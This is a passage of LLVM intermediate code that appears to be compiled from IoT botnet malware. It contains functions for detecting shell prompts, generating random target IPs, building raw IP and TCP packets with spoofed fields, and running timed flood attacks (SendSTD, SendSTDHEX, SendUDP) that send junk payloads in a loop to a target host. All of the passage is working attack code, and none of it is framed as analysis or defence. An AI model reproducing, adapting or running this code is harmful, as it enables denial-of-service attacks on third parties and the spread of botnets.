  %15 = getelementptr inbounds i32, i32* %9, i64 %12
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = icmp ult i64 %17, %4
  br i1 %18, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.._crit_edge_crit_edge
  %19 = phi i8* [ %.pre14, %.._crit_edge_crit_edge ], [ %11, %._crit_edge.loopexit ]
  %.lcssa = phi i64 [ 0, %.._crit_edge_crit_edge ], [ %4, %._crit_edge.loopexit ]
  %20 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %20, align 4
  tail call void @free(i8* %19) #7
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %21

; <label>:21:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #8 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #14
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext41 = shl i64 %1, 32
  %5 = ashr exact i64 %sext41, 32
  %6 = icmp sgt i32 %2, 0
  br i1 %6, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %7 = icmp sgt i32 %2, %.1.lcssa
  br i1 %7, label %.lr.ph.1.preheader, label %.critedge.1

.lr.ph.1.preheader:                               ; preds = %.preheader.137
  br label %.lr.ph.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %12, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %8 = sub nsw i64 0, %indvars.iv
  %9 = getelementptr inbounds i8, i8* %4, i64 %8
  %10 = load i8, i8* %9, align 1
  %11 = trunc i64 %indvars.iv to i32
  switch i8 %10, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %12 = add nsw i32 %.130, 1
  %13 = icmp sgt i64 %5, %indvars.iv.next
  br i1 %13, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %11, %.lr.ph ], [ %12, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %14 = sext i32 %.1.lcssa to i64
  %15 = sub nsw i64 0, %14
  %16 = getelementptr inbounds i8, i8* %4, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = icmp eq i8 %17, 58
  br i1 %18, label %19, label %.preheader.137

; <label>:19:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.1:                                         ; preds = %.lr.ph.1.preheader, %.critedge1.1
  %indvars.iv.1 = phi i64 [ %indvars.iv.next.1, %.critedge1.1 ], [ %14, %.lr.ph.1.preheader ]
  %.130.1 = phi i32 [ %24, %.critedge1.1 ], [ %.1.lcssa, %.lr.ph.1.preheader ]
  %20 = sub nsw i64 0, %indvars.iv.1
  %21 = getelementptr inbounds i8, i8* %4, i64 %20
  %22 = load i8, i8* %21, align 1
  %23 = trunc i64 %indvars.iv.1 to i32
  switch i8 %22, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %24 = add nsw i32 %.130.1, 1
  %25 = icmp sgt i64 %5, %indvars.iv.next.1
  br i1 %25, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %23, %.lr.ph.1 ], [ %24, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %26 = sext i32 %.1.lcssa.1 to i64
  %27 = sub nsw i64 0, %26
  %28 = getelementptr inbounds i8, i8* %4, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 62
  br i1 %30, label %19, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %31 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %31, label %.lr.ph.2.preheader, label %.critedge.2

.lr.ph.2.preheader:                               ; preds = %.preheader.238
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.lr.ph.2.preheader, %.critedge1.2
  %indvars.iv.2 = phi i64 [ %indvars.iv.next.2, %.critedge1.2 ], [ %26, %.lr.ph.2.preheader ]
  %.130.2 = phi i32 [ %36, %.critedge1.2 ], [ %.1.lcssa.1, %.lr.ph.2.preheader ]
  %32 = sub nsw i64 0, %indvars.iv.2
  %33 = getelementptr inbounds i8, i8* %4, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = trunc i64 %indvars.iv.2 to i32
  switch i8 %34, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %36 = add nsw i32 %.130.2, 1
  %37 = icmp sgt i64 %5, %indvars.iv.next.2
  br i1 %37, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %35, %.lr.ph.2 ], [ %36, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %38 = sext i32 %.1.lcssa.2 to i64
  %39 = sub nsw i64 0, %38
  %40 = getelementptr inbounds i8, i8* %4, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = icmp eq i8 %41, 37
  br i1 %42, label %19, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %43 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %43, label %.lr.ph.3.preheader, label %.critedge.3

.lr.ph.3.preheader:                               ; preds = %.preheader.339
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.lr.ph.3.preheader, %.critedge1.3
  %indvars.iv.3 = phi i64 [ %indvars.iv.next.3, %.critedge1.3 ], [ %38, %.lr.ph.3.preheader ]
  %.130.3 = phi i32 [ %48, %.critedge1.3 ], [ %.1.lcssa.2, %.lr.ph.3.preheader ]
  %44 = sub nsw i64 0, %indvars.iv.3
  %45 = getelementptr inbounds i8, i8* %4, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = trunc i64 %indvars.iv.3 to i32
  switch i8 %46, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %48 = add nsw i32 %.130.3, 1
  %49 = icmp sgt i64 %5, %indvars.iv.next.3
  br i1 %49, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %47, %.lr.ph.3 ], [ %48, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %50 = sext i32 %.1.lcssa.3 to i64
  %51 = sub nsw i64 0, %50
  %52 = getelementptr inbounds i8, i8* %4, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = icmp eq i8 %53, 36
  br i1 %54, label %19, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %55 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %55, label %.lr.ph.4.preheader, label %.critedge.4

.lr.ph.4.preheader:                               ; preds = %.preheader.440
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.lr.ph.4.preheader, %.critedge1.4
  %indvars.iv.4 = phi i64 [ %indvars.iv.next.4, %.critedge1.4 ], [ %50, %.lr.ph.4.preheader ]
  %.130.4 = phi i32 [ %60, %.critedge1.4 ], [ %.1.lcssa.3, %.lr.ph.4.preheader ]
  %56 = sub nsw i64 0, %indvars.iv.4
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = trunc i64 %indvars.iv.4 to i32
  switch i8 %58, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %60 = add nsw i32 %.130.4, 1
  %61 = icmp sgt i64 %5, %indvars.iv.next.4
  br i1 %61, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %59, %.lr.ph.4 ], [ %60, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %62 = sext i32 %.1.lcssa.4 to i64
  %63 = sub nsw i64 0, %62
  %64 = getelementptr inbounds i8, i8* %4, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = icmp eq i8 %65, 35
  %. = zext i1 %66 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #15
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv33 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv33, 4
  br i1 %min.iters.check, label %.lr.ph16.preheader34, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph16.preheader
  %8 = zext i32 %addconv33 to i64
  %9 = and i32 %addconv33, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end27 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph16.preheader34, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi28 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load31 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load31 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi28
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !16

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx32 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx32, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge17.loopexit, label %.lr.ph16.preheader34

.lr.ph16.preheader34:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph16.preheader
  %.014.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph16.preheader ], [ %19, %middle.block ]
  %.0913.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph16.preheader ], [ %ind.end, %middle.block ]
  %.01012.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph16.preheader ], [ %ind.end27, %middle.block ]
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16.preheader34, %.lr.ph16
  %.014 = phi i64 [ %23, %.lr.ph16 ], [ %.014.ph, %.lr.ph16.preheader34 ]
  %.0913 = phi i32 [ %24, %.lr.ph16 ], [ %.0913.ph, %.lr.ph16.preheader34 ]
  %.01012 = phi i16* [ %20, %.lr.ph16 ], [ %.01012.ph, %.lr.ph16.preheader34 ]
  %20 = getelementptr inbounds i16, i16* %.01012, i64 1
  %21 = load i16, i16* %.01012, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.014
  %24 = add nsw i32 %.0913, -2
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %.lr.ph16, label %._crit_edge17.loopexit.loopexit, !llvm.loop !17

._crit_edge17.loopexit.loopexit:                  ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %._crit_edge17.loopexit.loopexit, %middle.block
  %.lcssa25 = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge17.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa25, %._crit_edge17.loopexit ]
  %27 = icmp eq i32 %.09.lcssa, 1
  br i1 %27, label %28, label %.preheader

; <label>:28:                                     ; preds = %._crit_edge17
  %29 = bitcast i16* %.010.lcssa to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = add i64 %31, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %28, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %32, %28 ]
  %33 = lshr i64 %.1.ph, 16
  %34 = icmp eq i64 %33, 0
  br i1 %34, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %35 = phi i64 [ %38, %.lr.ph ], [ %33, %.lr.ph.preheader ]
  %.111 = phi i64 [ %37, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %36 = and i64 %.111, 65535
  %37 = add nuw nsw i64 %36, %35
  %38 = lshr i64 %37, 16
  %39 = icmp eq i64 %38, 0
  br i1 %39, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %37, %._crit_edge.loopexit ]
  %40 = trunc i64 %.1.lcssa to i16
  %41 = xor i16 %40, -1
  ret i16 %41
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = bitcast i32* %3 to <2 x i32>*
  %5 = load <2 x i32>, <2 x i32>* %4, align 4
  %6 = zext <2 x i32> %5 to <2 x i64>
  %7 = tail call zeroext i16 @htons(i16 zeroext 20) #15
  %8 = tail call noalias i8* @malloc(i64 44) #7
  %9 = bitcast i8* %8 to i16*
  %10 = bitcast i8* %8 to <2 x i64>*
  store <2 x i64> %6, <2 x i64>* %10, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %8, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %8, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %8, i64 18
  %11 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %7, i16* %11, align 1
  %12 = getelementptr inbounds i8, i8* %8, i64 24
  %13 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* %13, i64 20, i32 1, i1 false)
  %14 = tail call zeroext i16 @csum(i16* %9, i32 44)
  tail call void @free(i8* %8) #7
  ret i16 %14
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #3 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #7
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @SendSTDHEX(i8*, i32, i32) local_unnamed_addr #11 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca [1 x i8*], align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #7
  %7 = tail call i64 @time(i64* null) #7
  %8 = tail call %struct.hostent* @gethostbyname(i8* %0) #7
  %9 = bitcast %struct.sockaddr_in* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %9, i8 0, i64 16, i32 4, i1 false)
  %10 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 4
  %11 = load i8**, i8*** %10, align 8
  %12 = load i8*, i8** %11, align 8
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %14 = bitcast %struct.in_addr* %13 to i8*
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 3
  %16 = load i32, i32* %15, align 4
  %17 = sext i32 %16 to i64
  call void @bcopy(i8* %12, i8* %14, i64 %17) #7
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 2
  %19 = load i32, i32* %18, align 8
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 %20, i16* %21, align 4
  %22 = trunc i32 %1 to i16
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = bitcast [1 x i8*]* %5 to i8*
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* %5, i64 0, i64 0
  %26 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %27 = sext i32 %2 to i64
  %28 = add nsw i64 %7, %27
  br label %29

; <label>:29:                                     ; preds = %38, %3
  %.0 = phi i32 [ 0, %3 ], [ %39, %38 ]
  store i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str.75, i64 0, i64 0), i8** %25, align 8
  %30 = icmp ugt i32 %.0, 49
  br i1 %30, label %31, label %38

; <label>:31:                                     ; preds = %29
  %32 = call i64 @send(i32 %6, i8* nonnull %24, i64 1460, i32 0) #7
  %33 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %26, i32 16) #7
  %34 = call i64 @time(i64* null) #7
  %35 = icmp slt i64 %34, %28
  br i1 %35, label %38, label %36

; <label>:36:                                     ; preds = %31
  %37 = call i32 @close(i32 %6) #7
  call void @_exit(i32 0) #16
  unreachable

; <label>:38:                                     ; preds = %31, %29
  %.1 = phi i32 [ %.0, %29 ], [ 0, %31 ]
  %39 = add i32 %.1, 1
  br label %29
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #5

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #2

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #12

; Function Attrs: noinline noreturn nounwind uwtable
define void @SendSTD(i8*, i32, i32) local_unnamed_addr #11 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 @socket(i32 2, i32 2, i32 0) #7
  %6 = tail call i64 @time(i64* null) #7
  %7 = tail call %struct.hostent* @gethostbyname(i8* %0) #7
  %8 = bitcast %struct.sockaddr_in* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %8, i8 0, i64 16, i32 4, i1 false)
  %9 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 4
  %10 = load i8**, i8*** %9, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %13 = bitcast %struct.in_addr* %12 to i8*
  %14 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 3
  %15 = load i32, i32* %14, align 4
  %16 = sext i32 %15 to i64
  call void @bcopy(i8* %11, i8* %13, i64 %16) #7
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 2
  %18 = load i32, i32* %17, align 8
  %19 = trunc i32 %18 to i16
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 %19, i16* %20, align 4
  %21 = trunc i32 %1 to i16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %21, i16* %22, align 2
  %23 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %24 = sext i32 %2 to i64
  %25 = add nsw i64 %6, %24
  br label %26

; <label>:26:                                     ; preds = %40, %3
  %.0 = phi i32 [ 0, %3 ], [ %41, %40 ]
  %27 = call i32 @rand() #7
  %28 = icmp ugt i32 %.0, 49
  br i1 %28, label %29, label %40

; <label>:29:                                     ; preds = %26
  %30 = sext i32 %27 to i64
  %31 = urem i64 %30, 26
  %32 = getelementptr inbounds [26 x i8*], [26 x i8*]* @SendSTD.randstrings, i64 0, i64 %31
  %33 = load i8*, i8** %32, align 8
  %34 = call i64 @send(i32 %5, i8* %33, i64 69, i32 0) #7
  %35 = call i32 @connect(i32 %5, %struct.sockaddr* nonnull %23, i32 16) #7
  %36 = call i64 @time(i64* null) #7
  %37 = icmp slt i64 %36, %25
  br i1 %37, label %40, label %38

; <label>:38:                                     ; preds = %29
  %39 = call i32 @close(i32 %5) #7
  call void @_exit(i32 0) #16
  unreachable

; <label>:40:                                     ; preds = %29, %26
  %.1 = phi i32 [ %.0, %26 ], [ 0, %29 ]
  %41 = add i32 %.1, 1
  br label %26
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #15
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %117

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = tail call i32 @socket(i32 2, i32 3, i32 17) #7
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %117, label %27

; <label>:27:                                     ; preds = %22
  store i32 1, i32* %8, align 4
  %28 = bitcast i32* %8 to i8*
  %29 = call i32 @setsockopt(i32 %25, i32 0, i32 3, i8* nonnull %28, i32 4) #7
  %30 = icmp slt i32 %29, 0
  br i1 %30, label %117, label %.preheader.preheader

.preheader.preheader:                             ; preds = %27
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.04041 = phi i32 [ %31, %.preheader ], [ 50, %.preheader.preheader ]
  %31 = add nsw i32 %.04041, -1
  %32 = call i64 @time(i64* null) #7
  %33 = call i32 @rand_cmwc()
  %34 = zext i32 %33 to i64
  %35 = xor i64 %34, %32
  %36 = trunc i64 %35 to i32
  call void @srand(i32 %36) #7
  %37 = call i32 @rand() #7
  call void @init_rand(i32 %37)
  %38 = icmp eq i32 %31, 0
  br i1 %38, label %39, label %.preheader

; <label>:39:                                     ; preds = %.preheader
  %40 = sub nsw i32 32, %5
  %41 = shl i32 -1, %40
  %42 = sext i32 %3 to i64
